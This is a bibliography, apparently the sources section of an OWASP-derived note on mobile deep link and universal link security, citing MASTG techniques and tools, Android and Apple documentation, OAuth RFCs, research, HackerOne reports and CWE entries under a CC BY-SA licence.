- OWASP MASTG best practices: [MASTG-BEST-0070](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0070/), [MASTG-BEST-0071](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0071/), [MASTG-BEST-0054](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0054/), [MASTG-BEST-0055](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0055/), [MASTG-BEST-0072](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0072/), [MASTG-BEST-0045](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0045/) (CC BY-SA 4.0)
- OWASP MASTG techniques: [MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/), [MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/), [MASTG-TECH-0172](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0172/), [MASTG-TECH-0173](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0173/), [MASTG-TECH-0174](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0174/), [MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/), [MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/), [MASTG-TECH-0111](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0111/), [MASTG-TECH-0166](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0166/), [MASTG-TECH-0169](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0169/), [MASTG-TECH-0175](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0175/), [MASTG-TECH-0176](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0176/) (CC BY-SA 4.0)
- OWASP MASTG tools: [adb (MASTG-TOOL-0004)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0004/), [Apktool (MASTG-TOOL-0011)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0011/), [jadx (MASTG-TOOL-0018)](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/), [Frida (MASTG-TOOL-0031)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0031/), [Frida CodeShare (MASTG-TOOL-0032)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0032/), [Frida for iOS (MASTG-TOOL-0039)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/), [xcrun (MASTG-TOOL-0072)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0072/), [radare2 for iOS (MASTG-TOOL-0073)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/), [semgrep (MASTG-TOOL-0110)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/), [ldid (MASTG-TOOL-0111)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0111/), [codesign (MASTG-TOOL-0114)](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0114/), [rabin2 (MASTG-TOOL-0129)](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0129/) (CC BY-SA 4.0)
- Android Developers: [Create deep links to app content](https://developer.android.com/training/app-links/deep-linking), [About App Links](https://developer.android.com/training/app-links), [Verify Android App Links](https://developer.android.com/training/app-links/verify-android-applinks), [Behavior changes: all apps on Android 12 (web intent resolution)](https://developer.android.com/about/versions/12/behavior-changes-all), [Behavior changes: apps targeting Android 12 (App Links verification, safer component exporting)](https://developer.android.com/about/versions/12/behavior-changes-12), [Intents and intent filters](https://developer.android.com/guide/components/intents-filters), [Unsafe use of deep links](https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks), [`Uri`](https://developer.android.com/reference/android/net/Uri), [`DomainVerificationManager`](https://developer.android.com/reference/android/content/pm/verify/domain/DomainVerificationManager)
- Google: [Digital Asset Links: Getting started](https://developers.google.com/digital-asset-links/v1/getting-started), [Android Intents with Chrome](https://developer.chrome.com/docs/android/intents)
- Apple: [Defining a custom URL scheme for your app](https://developer.apple.com/documentation/xcode/defining-a-custom-url-scheme-for-your-app), [Allowing apps and websites to link to your content](https://developer.apple.com/documentation/xcode/allowing-apps-and-websites-to-link-to-your-content), [Supporting associated domains](https://developer.apple.com/documentation/xcode/supporting-associated-domains), [Supporting universal links in your app](https://developer.apple.com/documentation/xcode/supporting-universal-links-in-your-app), [TN3155: Debugging universal links](https://developer.apple.com/documentation/technotes/tn3155-debugging-universal-links), [`application(_:open:options:)`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application), [`UIApplication.OpenURLOptionsKey.sourceApplication`](https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey/sourceapplication), [`UIScene.OpenURLOptions.sourceApplication`](https://developer.apple.com/documentation/uikit/uiscene/openurloptions/sourceapplication), [`canOpenURL(_:)`](https://developer.apple.com/documentation/uikit/uiapplication/1622952-canopenurl), [`NSUserActivity`](https://developer.apple.com/documentation/foundation/nsuseractivity), [`webpageURL`](https://developer.apple.com/documentation/foundation/nsuseractivity/1418086-webpageurl), [`application(_:continue:restorationHandler:)`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623072-application), [`scene(_:continue:)`](https://developer.apple.com/documentation/uikit/uiscenedelegate/3238056-scene), [`URLComponents`](https://developer.apple.com/documentation/foundation/urlcomponents)
- IETF: [RFC 8252: OAuth 2.0 for Native Apps](https://www.rfc-editor.org/rfc/rfc8252), [RFC 7636: Proof Key for Code Exchange](https://www.rfc-editor.org/rfc/rfc7636), [RFC 9700: Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700)
- Research and tools: [Liu et al., Measuring the Insecurity of Mobile Deep Links of Android (USENIX Security 2017)](https://people.cs.vt.edu/gangwang/deep17.pdf), [Android App Link Verification Tester](https://github.com/inesmartins/Android-App-Link-Verification-Tester), [Frida CodeShare: Android Deep Link Observer](https://codeshare.frida.re/@leolashkevych/android-deep-link-observer/), [Learning about Universal Links and Fuzzing URL Schemes on iOS with Frida (Carlos Holguera)](https://grepharder.github.io/blog/0x03_learning_about_universal_links_and_fuzzing_url_schemes_on_ios_with_frida.html), HackerOne reports cited by MASTG-TEST-0393: [1372667](https://hackerone.com/reports/1372667), [401793](https://hackerone.com/reports/401793), [583987](https://hackerone.com/reports/583987), [341908](https://hackerone.com/reports/341908)
- CWE: [CWE-939](https://cwe.mitre.org/data/definitions/939.html), [CWE-917](https://cwe.mitre.org/data/definitions/917.html)

> Adapted and extended from the OWASP MASWE and MASTG (https://mas.owasp.org), licensed under CC BY-SA 4.0. This note is distributed under the same licence.
